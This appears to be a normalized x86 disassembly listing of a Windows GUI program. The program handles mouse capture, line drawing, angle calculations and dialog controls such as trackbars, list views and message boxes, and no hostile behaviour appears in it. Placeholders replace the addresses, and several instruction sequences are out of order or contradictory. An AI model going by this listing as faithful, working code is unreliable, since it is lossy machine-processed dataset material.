mov [ ebp + 0x8 ] esp
call sub_465d30
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x7
xor ecx ecx
jmp r-xdata
test edx edx
jne r-xdata
shl eax 0x7
push eax
mov [ ebp + 0x10 ] eax
call sub_4b573e
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
add esp 0x4
push ecx
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x14 ] ebx
mov [ ebp + 0xc ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] eax
call sub_4660a0
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push esi
lea edx [ ebp - 0x98 ]
push edx
push edi
push eax
mov [ ebp + 0xc ] eax
call sub_46a2c0
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x14
push edx
mov eax edi
shl eax 0x7
add ecx eax
mov eax [ esi + 0x8 ]
push esi
push ecx
push ecx
mov [ ebp + 0xc ] ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_4660a0
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
mov [ ebp - 0x4 ] 0x0
jne r-xdata
test edx edx
jne r-xdata
add ecx edi
cmp eax ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x7
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edx
sar eax 0x7
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
add eax ebx
shl edi 0x7
add edi ebx
mov [ esi + 0xc ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] ebx
jmp r-xdata
mov edx [ esi + 0x8 ]
push edx
push ecx
mov ecx esi
call sub_469680
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
add edi eax
test ecx ecx
je r-xdata
add eax edi
sub_46cf30
mov eax [ rw-data ]
push esi
xor esi esi
cmp eax esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
lea eax [ esp + 0x8 ]
push eax
mov ecx rw-data
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_46b8c0
mov [ rw-data ] esi
mov [ rw-data ] 0x1
pop esi
retn
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_46cfa0
sub esp 0x10
push esi
mov esi [ rw-data ]
test esi esi
push edi
mov edi [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test eax eax
push ebx
mov ebx [ esp + 0x20 ]
je r-xdata
mov ecx edi
sub ecx esi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
cmp edx 0x8
jb r-xdata
lea edx [ esp + 0x10 ]
push edx
mov ecx rw-data
mov [ esp + 0x1c ] ebx
call sub_46b930
pop ebx
pop edi
mov eax 0x1
pop esi
add esp 0x10
retn
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x10
retn
mov ecx edi
sub ecx esi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0xc ] edx
je r-xdata
cmp [ edi - 0x4 ] ebx
jne r-xdata
pop ebx
pop edi
xor eax eax
pop esi
add esp 0x10
retn
sub_46d030
mov ecx [ rw-data ]
sub esp 0x60
test ecx ecx
je r-xdata
xor eax eax
add esp 0x60
retn
mov eax [ rw-data ]
sub eax ecx
sar eax 0x3
test eax eax
jne r-xdata
push ebx
push ebp
push esi
push edi
lea eax [ esp + 0x74 ]
push eax
mov ecx rw-data
call sub_46b8c0
call [ GetTickCount@IAT ]
mov cl [ rw-data ]
test cl cl
mov esi [ esp + 0x78 ]
mov edi [ esp + 0x74 ]
mov [ esp + 0x20 ] eax
jne r-xdata
mov ebp [ rw-data ]
mov ebx [ rw-data ]
mov edx [ ebp + ebx * 8 ]
mov eax [ ebp + ebx * 8 + 0x4 ]
mov ecx edi
sub ecx edx
mov edx esi
sub edx eax
mov eax edx
imul eax edx
mov edx ecx
imul edx ecx
add eax edx
cmp eax 0x10
jle r-xdata
mov ebx [ rw-data ]
mov edx [ esp + 0x84 ]
mov ecx eax
sub ecx ebx
cmp ecx edx
jbe r-xdata
mov eax [ ebp + ebx * 8 ]
mov ecx [ ebp + ebx * 8 + 0x4 ]
sub edi eax
mov eax [ esp + 0x80 ]
sub esi ecx
imul eax eax
mov ecx esi
mov edx edi
imul ecx esi
imul edx edi
add ecx edx
cmp ecx eax
mov [ esp + 0x1c ] eax
jle r-xdata
mov eax [ esp + 0x20 ]
mov [ rw-data ] eax
mov ebp [ rw-data ]
test ebp ebp
mov [ rw-data ] eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x60
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ebx [ rw-data ]
sub ebx ebp
sar ebx 0x3
xor ebx ebx
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
cmp edx 0x8
jae r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ esp + 0x7c ]
dec ebx
test eax eax
mov [ rw-data ] ebx
jne r-xdata
fld [ r--data ]
mov ecx [ rw-data ]
fld1
mov edx [ ecx - 0x4 ]
fpatan
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x18 ] ebx
mov edi ebx
lea eax [ ebp + ebx * 8 + 0xc ]
fmul [ r--data ]
fld [ r--data ]
fmul st1
fstp [ esp + 0x58 ]
fst [ esp + 0x60 ]
fld [ r--data ]
fmul st1
fstp [ esp + 0x68 ]
fld [ esp + edx * 8 + 0x50 ]
fst [ esp + 0x44 ]
fld [ r--data ]
push esi
push edi
mov [ rw-data ] 0x0
call sub_45b0d0
add esp 0x8
jmp r-xdata
mov eax [ rw-data ]
sub eax ebp
sar eax 0x3
xor eax eax
jmp r-xdata
test ebx ebx
jl r-xdata
fild [ esp + 0x88 ]
fmul st3
fmul [ r--data ]
fstp [ esp + 0x3c ]
fabs
fcomp [ esp + 0x3c ]
fnstsw ax
test ah 0x41
jne r-xdata
xor ecx ecx
xor edx edx
cmp edi ebx
mov esi edi
je r-xdata
dec eax
cmp edi eax
jge r-xdata
mov edx [ ebp + ebx * 8 ]
mov ecx [ ebp + ebx * 8 + 0x4 ]
mov [ esp + 0x44 ] edx
lea edx [ esp + 0x44 ]
mov [ esp + 0x48 ] ecx
push edx
mov ecx rw-data
mov [ esp + 0x50 ] eax
call sub_46b930
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
fsubr [ esp + 0x24 ]
fld st0
fabs
fcomp st2
fnstsw ax
test ah 0x41
jne r-xdata
fld [ esp + 0x34 ]
fabs
fld st2
fmul [ r--data ]
fcompp
fnstsw ax
test ah 0x41
jne r-xdata
fld st1
jmp r-xdata
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea esp [ esp ]
mov eax [ rw-data ]
sub eax ecx
pop edi
sar eax 0x3
pop esi
dec eax
pop ebp
mov [ rw-data ] eax
mov eax 0x1
pop ebx
add esp 0x60
retn
pop edi
xor eax eax
pop esi
dec eax
pop ebp
mov [ rw-data ] eax
mov eax 0x1
pop ebx
add esp 0x60
retn
fabs
fild [ esp + 0x8c ]
fmul st2
fmul [ r--data ]
fcompp
fnstsw ax
fstp st0
test ah 0x5
jpe r-xdata
fstp st0
fld [ esp + 0x24 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x5
jpe r-xdata
fld [ esp + 0x24 ]
fsub st1
fabs
fcomp [ esp + 0x3c ]
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ esp + 0x14 ]
xor edx edx
xor esi esi
mov edi [ esp + 0x10 ]
mov ebp [ rw-data ]
mov [ esp + 0x30 ] edx
fild [ esp + 0x30 ]
mov [ esp + 0x2c ] ecx
fild [ esp + 0x2c ]
fpatan
dec esi
sub eax 0x8
cmp esi ebx
jne r-xdata
fld [ esp + 0x24 ]
mov ebx [ esp + 0x18 ]
fcos
sub esp 0x8
fmul [ r--data ]
fstp [ esp ]
call sub_452510
fld [ esp + 0x2c ]
mov esi eax
fsin
fmul [ r--data ]
fstp [ esp ]
call sub_452510
push eax
push esi
call sub_45b0d0
mov ebp [ rw-data ]
add esp 0x10
fld st0
fchs
fld st1
fsub [ esp + 0x24 ]
fsubp st1
fld [ esp + 0x24 ]
fadd st1
fadd st1
jmp r-xdata
fstp st0
fstp st0
jmp r-xdata
mov ecx [ rw-data ]
sub ecx ebp
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov ebp [ eax - 0x4 ]
mov edi [ eax + 0x4 ]
sub edi ebp
mov ebp [ eax ]
add ecx edi
mov edi [ eax + 0x8 ]
sub edi ebp
add edx edi
mov edi edx
mov ebp ecx
imul edi edx
imul ebp ecx
add edi ebp
cmp edi [ esp + 0x1c ]
jg r-xdata
mov edi [ esp + 0x10 ]
mov ebp [ rw-data ]
mov [ esp + 0x30 ] edx
mov [ esp + 0x2c ] ecx
fstp [ esp + 0x24 ]
fld [ esp + 0x24 ]
fsub [ esp + 0x44 ]
fstp st0
mov edi [ eax - 0xc ]
mov ecx [ eax - 0x4 ]
sub ecx edi
mov edi [ eax - 0x8 ]
add edx ecx
mov ecx [ eax ]
sub ecx edi
add esi ecx
mov ecx esi
mov edi edx
imul ecx esi
imul edi edx
add ecx edi
cmp ecx [ esp + 0x1c ]
mov [ esp + 0x3c ] edx
mov [ esp + 0x40 ] esi
jg r-xdata
dec ecx
cmp edi ecx
je r-xdata
fild [ esp + 0x40 ]
fild [ esp + 0x3c ]
fpatan
fst [ esp + 0x24 ]
fld st0
fsub st2
fst [ esp + 0x34 ]
fabs
fcomp st5
fnstsw ax
test ah 0x41
jne r-xdata
mov edi [ esp + 0x20 ]
inc edi
add eax 0x8
jmp r-xdata
fstp st0
fcom [ r--data ]
fld st4
fnstsw ax
test ah 0x5
jpe r-xdata
test ebp ebp
mov [ esp + 0x20 ] edi
jne r-xdata
mov eax [ esp + 0x14 ]
inc edi
add eax 0x8
jmp r-xdata
fstp st0
mov [ esp + 0x18 ] edi
fld [ esp + 0x34 ]
fchs
fld st5
fsub st2
fsubp st1
fstp st1
fsub st1
fstp [ esp + 0x34 ]
jmp r-xdata
faddp st1
fadd st4
fsub st1
fstp [ esp + 0x34 ]
jmp r-xdata
test ebp ebp
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] eax
jne r-xdata
mov edi [ esp + 0x10 ]
fstp st0
fld st0
fabs
fld [ esp + 0x34 ]
fabs
fcompp
fnstsw ax
test ah 0x41
jne r-xdata
sub_46d4c0
mov eax [ esp + 0x8 ]
sub esp 0x1a0
cmp eax 0x200
push ebx
push ebp
push esi
push edi
ja r-xdata
add eax 0xfffffdff
cmp eax 0x4
ja r-xdata
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1a0
retn 0x10
jmp [ eax * 4 + jump_table_46e5dc ]
mov al [ rw-data ]
test al al
je r-xdata
cmp eax 0x4e
ja r-xdata
mov eax [ esp + 0x1c0 ]
movzx ebp ax
shr eax 0x10
mov edx eax
cmp [ rw-data ] ebp
mov [ esp + 0x30 ] edx
jg r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ esp + 0x1c0 ]
mov edx [ rw-data ]
movzx ecx ax
shr eax 0x10
cmp edx ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] eax
jg r-xdata
sub eax 0x110
je r-xdata
je r-xdata
cmp [ rw-data ] ebp
jle r-xdata
mov [ rw-data ] 0x0
call [ ReleaseCapture@IAT ]
cmp [ rw-data ] ecx
jle r-xdata
mov ecx rw-data
call sub_462cf0
mov ecx rw-data
call sub_462cf0
mov eax [ rw-data ]
test eax eax
mov edi [ esp + 0x1b4 ]
je r-xdata
dec eax
jne r-xdata
mov edi [ esp + 0x1c0 ]
mov eax [ edi + 0x8 ]
cmp eax 0xffffff36
jne r-xdata
sub eax 0x2
je r-xdata
cmp [ rw-data ] edx
jg r-xdata
cmp [ rw-data ] eax
jg r-xdata
push 0x0
push 0x1
jmp r-xdata
mov ecx [ esp + 0x1bc ]
movzx eax cx
sub eax 0x777
je r-xdata
cmp [ esp + 0x1bc ] 0x778
jne r-xdata
mov ebx [ esp + 0x1b4 ]
push 0x778
push ebx
call [ GetDlgItem@IAT ]
mov esi [ SendMessageA@IAT ]
push 0x0
push 0x0
mov ebp eax
push 0x1004
push ebp
call esi
mov edx [ esp + 0x2c ]
push edx
push eax
mov ecx rw-data
mov [ esp + 0x2c ] eax
call sub_46aa70
mov eax [ esp + 0x24 ]
xor edi edi
test eax eax
mov [ esp + 0x6c ] 0x4
jle r-xdata
mov ecx rw-data
call sub_462cf0
mov ecx rw-data
call sub_462cf0
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
sub eax 0xd
jne r-xdata
cmp [ rw-data ] edx
jle r-xdata
cmp [ rw-data ] eax
jle r-xdata
push 0x0
push 0xfffffffa
push edi
call [ GetWindowLongA@IAT ]
push eax
push 0x777
push edi
push 0x168
push 0x118
push 0xb
push 0x118
push 0x50000003
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
test ebx ebx
mov [ esp + 0x14 ] eax
je r-xdata
xor eax eax
push edi
mov [ esp + 0x44 ] eax
mov [ esp + 0x1c ] eax
call [ GetDC@IAT ]
push r--data
lea ecx [ esp + 0xb0 ]
push ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0xb4 ] 0x0
call [ lstrcatA@IAT ]
push 0x1010
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0xbc ]
push edx
push 0x0
call [ LoadImageA@IAT ]
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
push 0x781
push edi
call [ CheckDlgButton@IAT ]
mov ebp [ GetDlgItem@IAT ]
push 0x0
push 0x783
push edi
call ebp
push eax
push 0x469
push 0x784
push edi
call ebp
mov esi [ SendMessageA@IAT ]
push eax
call esi
push 0x64
push 0xa
push 0x465
push 0x784
push edi
call ebp
push eax
call esi
mov edx [ rw-data ]
push edx
push 0x0
push 0x467
push 0x784
push edi
call ebp
push eax
call esi
lea eax [ esp + 0x2c ]
push eax
mov ebx 0x2
push ebx
push 0x46b
push 0x784
push edi
mov [ esp + 0x40 ] 0x3
mov [ esp + 0x44 ] 0x5
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] 0xa
call ebp
push eax
call esi
push 0x0
push 0x786
push edi
call ebp
push eax
push 0x469
push 0x787
push edi
call ebp
push eax
call esi
push 0x3e8
push 0x14
push 0x465
push 0x787
push edi
call ebp
push eax
call esi
mov ecx [ rw-data ]
push ecx
push 0x0
push 0x467
push 0x787
push edi
call ebp
push eax
call esi
lea edx [ esp + 0x2c ]
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x30 ] 0x32
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] 0x64
push edx
push ebx
push 0x46b
push 0x787
push edi
call ebp
push eax
call esi
push 0x0
push 0x789
push edi
call ebp
push eax
push 0x469
push 0x78a
push edi
call ebp
push eax
call esi
push 0x5a
push 0xa
push 0x465
push 0x78a
push edi
call ebp
push eax
call esi
mov eax [ rw-data ]
push eax
push 0x0
push 0x467
push 0x78a
push edi
call ebp
push eax
call esi
lea ecx [ esp + 0x2c ]
push ecx
push ebx
push 0x46b
push 0x78a
push edi
mov [ esp + 0x40 ] 0x1
mov [ esp + 0x44 ] 0x5
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] 0xa
call ebp
push eax
call esi
push 0x0
push 0x795
push edi
call ebp
push eax
push 0x469
push 0x796
push edi
call ebp
push eax
call esi
push 0x78
push 0x1e
push 0x465
push 0x796
push edi
call ebp
push eax
call esi
mov edx [ rw-data ]
push edx
push 0x0
push 0x467
push 0x796
push edi
call ebp
push eax
call esi
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x30 ] 0x5
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] 0xa
lea eax [ esp + 0x2c ]
push eax
push ebx
push 0x46b
push 0x796
push edi
call ebp
push eax
call esi
push 0x0
push 0xac
push 0xfe
push 0x10
push 0x10
call [ ImageList_Create@IAT ]
mov ebx eax
test ebx ebx
mov [ esp + 0x24 ] ebx
je r-xdata
shr ecx 0x10
dec ecx
jne r-xdata
sub eax 0x2
je r-xdata
cmp eax 0xffffff94
je r-xdata
push 0x781
push ebx
call [ IsDlgButtonChecked@IAT ]
mov edi [ GetDlgItem@IAT ]
push 0x0
push 0x0
push 0x468
push 0x784
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push 0x0
push 0x0
push 0x468
movsx eax ax
push 0x787
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push 0x0
push 0x0
push 0x468
movsx ecx ax
push 0x78a
push ebx
mov [ rw-data ] ecx
call edi
push eax
call esi
push 0x0
push 0x0
push 0x468
movsx edx ax
push 0x796
push ebx
mov [ rw-data ] edx
call edi
push eax
call esi
movsx eax ax
mov [ rw-data ] eax
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
lea eax [ esp + 0x6c ]
push eax
push 0x0
push 0x1005
push ebp
mov [ esp + 0x80 ] edi
call esi
test eax eax
je r-xdata
mov ebp [ esp + 0x1b4 ]
lea eax [ esp + 0x6c ]
push eax
push ebp
call [ BeginPaint@IAT ]
push 0xffff00
push 0x4
mov edi eax
call [ CreateHatchBrush@IAT ]
mov esi eax
push esi
push edi
mov [ esp + 0x2c ] esi
call [ SelectObject@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ecx
mov ecx [ rw-data ]
push edx
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
push eax
push ecx
push edi
call [ Rectangle@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
mov esi [ esp + 0x1b4 ]
je r-xdata
mov esi [ esp + 0x1b4 ]
mov edi [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x468
push 0x787
push esi
call edi
push 0x0
push 0x0
push 0x468
push 0x784
push esi
movsx ebp ax
call edi
push 0x0
push 0x0
push 0x468
push 0x78a
push esi
movsx ebx ax
call edi
push 0x0
push 0x0
push 0x468
movsx edx ax
push 0x796
push esi
mov [ esp + 0x40 ] edx
call edi
push 0x781
push esi
movsx edi ax
call [ IsDlgButtonChecked@IAT ]
mov ecx [ rw-data ]
mov edx [ ecx - 0x8 ]
mov ecx [ ecx - 0x4 ]
push edi
mov [ esp + 0x28 ] edx
mov edx [ esp + 0x30 ]
push edx
push ebp
push ebx
push eax
mov eax [ esp + 0x34 ]
mov [ esp + 0x3c ] ecx
mov ecx [ esp + 0x30 ]
push eax
push ecx
call sub_46d030
add esp 0x1c
push esi
mov ebp eax
call [ GetDC@IAT ]
test ebp ebp
mov edi eax
je r-xdata
mov [ esp + 0x44 ] 0x7
xor ebx ebx
mov [ esp + 0x10 ] rw-data
mov [ esp + 0x1c ] 0xab
lea ebx [ ebx ]
push ebx
push 0x0
push 0x402
push eax
call esi
mov eax [ esp + 0x14 ]
push 0x10
push 0x10
push eax
call [ CreateCompatibleBitmap@IAT ]
test eax eax
mov [ esp + 0x3c ] eax
je r-xdata
mov eax [ esp + 0x14 ]
push eax
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ esp + 0x40 ] eax
je r-xdata
mov ecx [ esp + 0x1b4 ]
push 0x778
push ecx
call [ GetDlgItem@IAT ]
mov ebp [ SendMessageA@IAT ]
push 0x3
push 0xffffffff
mov edi eax
push 0x100c
push edi
call ebp
mov ebx eax
test ebx ebx
jl r-xdata
mov ecx rw-data
call sub_45d880
test eax eax
je r-xdata
dec eax
jne r-xdata
mov eax [ edi + 0x10 ]
test eax eax
mov ecx [ edi ]
jne r-xdata
cmp eax 0xffffff9b
jne r-xdata
mov eax [ esp + 0x24 ]
inc edi
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
mov edx [ esp + 0x8c ]
mov [ ecx + edi * 4 ] edx
mov eax [ esp + 0x10 ]
push eax
push edi
call [ SelectObject@IAT ]
push esi
call [ DeleteObject@IAT ]
lea ecx [ esp + 0x6c ]
push ecx
push ebp
call [ EndPaint@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x3
cmp ecx 0x2
jbe r-xdata
push edx
push ebp
mov [ rw-data ] 0x1
call sub_46cf30
add esp 0x8
push esi
call [ SetFocus@IAT ]
push esi
call [ SetCapture@IAT ]
push esi
call [ UpdateWindow@IAT ]
push 0x0
push 0x0
push 0x147
push 0x777
push esi
call [ SendDlgItemMessageA@IAT ]
inc eax
mov [ rw-data ] eax
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
mov eax [ rw-data ]
sub eax ecx
sar eax 0x3
test eax eax
jbe r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
push 0x0
push eax
push ecx
push edi
call [ MoveToEx@IAT ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
push edx
push eax
push edi
call [ LineTo@IAT ]
push edi
push esi
call [ ReleaseDC@IAT ]
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
push ebx
mov ecx rw-data
call sub_45d880
mov edx [ rw-data ]
push eax
add edx 0xfffffff4
mov ecx [ edx ]
sub esp 0xc
mov eax esp
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ eax + 0x4 ] ecx
push edi
mov [ eax + 0x8 ] edx
call sub_45b110
push esi
call sub_4608b0
add esp 0x1c
mov ecx [ esp + 0x10 ]
mov edx [ ecx ]
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x44 ]
push eax
push 0x0
push 0x401
push ecx
mov [ esp + 0x58 ] ebx
mov [ esp + 0x64 ] ebx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x5c ] edx
call esi
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x1c ]
add ecx 0x4
inc ebx
dec eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x1c ] eax
jne r-xdata
mov edx [ esp + 0x14 ]
push 0x0
push 0x0
push 0x14e
push edx
call esi
push 0x778
push edi
call ebp
push 0x0
push 0x0
mov ebx eax
push 0x1037
push ebx
mov [ esp + 0x2c ] ebx
call esi
or eax 0x21
push eax
push 0x0
push 0x1036
push ebx
call esi
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
push edx
push edi
call [ ReleaseDC@IAT ]
mov eax [ esp + 0x40 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
mov edx eax
push edx
call [ SelectObject@IAT ]
lea edx [ esp + 0x44 ]
push edx
push 0x0
push 0x1005
push edi
mov [ esp + 0x54 ] 0x4
mov [ esp + 0x58 ] ebx
call ebp
test eax eax
je r-xdata
mov esi [ esp + 0x1b4 ]
push 0x0
push 0x0
push 0x147
push 0x777
push esi
call [ SendDlgItemMessageA@IAT ]
inc eax
test eax eax
mov [ esp + 0x1c ] eax
jg r-xdata
mov eax [ esp + 0x1b4 ]
push 0x778
push eax
call [ GetDlgItem@IAT ]
mov ebx [ SendMessageA@IAT ]
push 0x2
push 0xffffffff
mov edi eax
push 0x100c
push edi
or ebp 0xffffffff
call ebx
mov esi eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
mov ebx [ rw-data ]
xor eax eax
cmp ebx 0x8
setne al
dec eax
and eax 0x100
add eax 0x8
jmp r-xdata
mov eax [ edi + 0xc ]
test eax eax
jl r-xdata
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push 0x0
push edx
push eax
push edi
call [ MoveToEx@IAT ]
mov ebx [ LineTo@IAT ]
mov esi 0x1
push 0x1
push rw-data
push esi
call [ InvalidateRect@IAT ]
push r--data
push 0x776
push esi
call [ SetDlgItemTextA@IAT ]
mov edi [ GetDlgItem@IAT ]
push 0x0
push 0x779
push esi
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x0
push 0x77a
push esi
call edi
push eax
call ebx
mov edx [ esp + 0x30 ]
lea eax [ esp + 0x44 ]
push eax
push 0x0
push 0x101b
push ebx
mov [ esp + 0x54 ] 0xf
mov [ esp + 0x5c ] 0x96
mov [ esp + 0x60 ] r--data
mov [ esp + 0x68 ] 0x0
call esi
lea ecx [ esp + 0x44 ]
push ecx
push 0x1
push 0x101b
push ebx
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x5c ] 0x6c
mov [ esp + 0x60 ] r--data
mov [ esp + 0x68 ] 0x1
call esi
lea edx [ esp + 0x2c ]
push edx
push 0x2
push 0x103a
push ebx
mov [ esp + 0x3c ] 0x1
mov [ esp + 0x40 ] 0x0
call esi
mov [ esp + 0x10 ] 0x0
push eax
push 0x1
push 0x1003
push ebx
call esi
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov edx [ esp + 0x3c ]
push edx
push eax
call [ SelectObject@IAT ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
mov [ esp + 0x34 ] eax
call [ SelectObject@IAT ]
mov eax [ esp + 0x1b4 ]
mov esi [ esp + 0x64 ]
push 0x0
push 0x0
push 0x147
push 0x777
push eax
call [ SendDlgItemMessageA@IAT ]
inc eax
test eax eax
jle r-xdata
push 0x778
push esi
call [ GetDlgItem@IAT ]
mov esi [ esp + 0x2c ]
mov ecx rw-data
mov ebx eax
and esi 0xffff
xor edi edi
call sub_45d880
test eax eax
jle r-xdata
push 0x0
push r--data
push r--data
push esi
call [ MessageBoxA@IAT ]
push 0x777
push esi
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
push 0x0
push 0x0
push 0x1004
push edi
call ebx
test eax eax
jle r-xdata
lea ebx [ ebx ]
or eax 0x100
cmp eax 0x2
je r-xdata
push sub_45b520
push eax
push 0x1030
push ecx
mov [ rw-data ] eax
call [ SendMessageA@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
mov esi [ esp + 0x1b4 ]
mov ebx [ GetDlgItem@IAT ]
push 0x778
push esi
call ebx
mov ecx [ edi + 0xc ]
lea edx [ esp + 0x6c ]
push edx
push 0x0
push 0x1005
push eax
mov [ esp + 0x7c ] 0xc
mov [ esp + 0x8c ] 0x2
mov [ esp + 0x80 ] ecx
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov ecx eax
push ecx
call [ DeleteObject@IAT ]
mov eax [ esp + 0x40 ]
push eax
call [ DeleteDC@IAT ]
mov ebx [ esp + 0x24 ]
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x44 ]
push eax
push 0x18
push ecx
call [ GetObjectA@IAT ]
xor ebx ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x1c ] 0xac
mov ecx eax
mov eax [ eax * 4 + rw-data ]
xor ecx esi
and ecx 0xfff
xor esi ecx
lea ecx [ esp + 0x6c ]
push ecx
mov edx esi
shl edx 0x14
push 0x0
sar edx 0x14
push 0x1006
dec edx
push edi
mov [ esp + 0x80 ] ebx
mov [ esp + 0x7c ] 0x7
mov [ esp + 0x98 ] edx
mov [ esp + 0x90 ] eax
mov [ esp + 0x84 ] 0x0
mov [ esp + 0x9c ] esi
call ebp
push edi
call [ SetFocus@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1a0
retn 0x10
mov ecx rw-data
call sub_45d880
mov ecx [ esp + 0x1c ]
mov edi [ SendMessageA@IAT ]
and eax 0xf
shl eax 0xc
mov edx ecx
and edx 0xfff
or eax edx
and esi 0xffff0000
or eax esi
mov esi eax
push 0x0
shl eax 0x14
push 0x0
sar eax 0x14
mov edx [ eax * 4 + rw-data ]
mov [ rw-data ] ecx
push 0x1004
lea ecx [ eax - 0x1 ]
push ebx
mov [ esp + 0x54 ] 0x7
mov [ esp + 0x70 ] ecx
mov [ esp + 0x74 ] esi
mov [ esp + 0x68 ] edx
mov [ esp + 0x5c ] 0x0
call edi
mov [ esp + 0x48 ] eax
lea eax [ esp + 0x44 ]
push eax
push 0x0
push 0x1007
push ebx
call edi
mov edx esi
lea ecx [ esp + 0xac ]
shr edx 0xc
push ecx
and edx 0xf
push edx
shr esi 0x10
push esi
call sub_45b070
add esp 0xc
lea edx [ esp + 0x44 ]
push edx
push 0x0
mov eax 0x1
push 0x1006
lea ecx [ esp + 0xb8 ]
push ebx
mov [ esp + 0x54 ] eax
mov [ esp + 0x68 ] ecx
